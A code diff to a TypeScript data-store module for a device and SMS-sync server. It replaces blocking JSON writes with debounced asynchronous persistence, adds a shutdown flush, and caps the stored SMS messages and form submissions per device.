@@ -1,5 +1,6 @@
 import { Device, DeviceData, SMS, FormData, ForwardingConfig, SimInfo } from './types/index.js';
 import fs from 'fs';
+import { promises as fsp } from 'fs';
 import path from 'path';
 
 // ─── Persistence helpers ────────────────────────────────────────────────────
@@ -12,6 +13,11 @@ import path from 'path';
 // on every reconnection via flushPendingSyncQueue).
 
 const DATA_FILE = path.join(__dirname, '..', 'data', 'store.json');
+
+// Cap in-memory arrays so a long-running server can't grow without bound
+// (SMS is re-synced by the app; forms are capped defensively).
+const MAX_SMS_PER_DEVICE = 2000;
+const MAX_FORMS_PER_DEVICE = 5000;
 
 interface PersistedDevice {
     id: string;
@@ -52,20 +58,50 @@ function derivePhoneFromSims(simCards?: SimInfo[]): string | undefined {
     return (simCards || []).find(s => s.phoneNumber && s.phoneNumber.trim())?.phoneNumber;
 }
 
-function persistDevices(devices: Map<string, DeviceData>) {
+function toPersistedArray(devices: Map<string, DeviceData>): PersistedDevice[] {
+    return Array.from(devices.values()).map(d => ({
+        id: d.device.id,
+        name: d.device.name,
+        phoneNumber: d.device.phoneNumber,
+        simCards: d.device.simCards || [],
+        forwarding: d.forwarding,
+        forms: d.forms,
+    }));
+}
+
+// Debounced, coalesced, ASYNC persistence: many mutations in a short window
+// produce one non-blocking write. This keeps the event loop free for socket.io
+// ping/pong — a synchronous write here could stall long enough to drop devices.
+let persistTimer: NodeJS.Timeout | null = null;
+let pendingDevices: Map<string, DeviceData> | null = null;
+
+function persistDevices(devices: Map<string, DeviceData>): void {
+    pendingDevices = devices;
+    if (persistTimer) return;
+    persistTimer = setTimeout(() => {
+        persistTimer = null;
+        const target = pendingDevices;
+        pendingDevices = null;
+        if (target) void writeDevicesToDisk(target);
+    }, 250);
+    persistTimer.unref?.();
+}
+
+async function writeDevicesToDisk(devices: Map<string, DeviceData>): Promise<void> {
     try {
         ensureDataDir();
-        const arr: PersistedDevice[] = Array.from(devices.values()).map(d => ({
-            id: d.device.id,
-            name: d.device.name,
-            phoneNumber: d.device.phoneNumber,
-            simCards: d.device.simCards || [],
-            forwarding: d.forwarding,
-            forms: d.forms,
-        }));
-        fs.writeFileSync(DATA_FILE, JSON.stringify(arr, null, 2), 'utf8');
+        await fsp.writeFile(DATA_FILE, JSON.stringify(toPersistedArray(devices)), 'utf8');
     } catch (e) {
         console.error('[Store] Failed to persist store to disk:', e);
+    }
+}
+
+function writeDevicesSync(devices: Map<string, DeviceData>): void {
+    try {
+        ensureDataDir();
+        fs.writeFileSync(DATA_FILE, JSON.stringify(toPersistedArray(devices)), 'utf8');
+    } catch (e) {
+        console.error('[Store] Failed to flush store to disk:', e);
     }
 }
 
@@ -93,6 +129,16 @@ class DataStore {
                 forwarding: p.forwarding,
             });
         }
+    }
+
+    /** Synchronously flush any debounced persistence (used on graceful shutdown). */
+    flushSync(): void {
+        if (persistTimer) {
+            clearTimeout(persistTimer);
+            persistTimer = null;
+        }
+        pendingDevices = null;
+        writeDevicesSync(this.devices);
     }
 
     // Get all devices
@@ -205,6 +251,9 @@ class DataStore {
             const existingIds = new Set(deviceData.sms.map(s => s.id));
             const newMessages = smsMessages.filter(s => !existingIds.has(s.id));
             deviceData.sms = [...deviceData.sms, ...newMessages];
+            if (deviceData.sms.length > MAX_SMS_PER_DEVICE) {
+                deviceData.sms = deviceData.sms.slice(-MAX_SMS_PER_DEVICE);
+            }
         }
     }
 
@@ -240,6 +289,9 @@ class DataStore {
             ...formData,
             submittedAt: new Date(),
         });
+        if (deviceData.forms.length > MAX_FORMS_PER_DEVICE) {
+            deviceData.forms = deviceData.forms.slice(-MAX_FORMS_PER_DEVICE);
+        }
         console.log(`[Store] Form stored for device ${deviceId}, total forms: ${deviceData.forms.length}`);
         persistDevices(this.devices);
     }
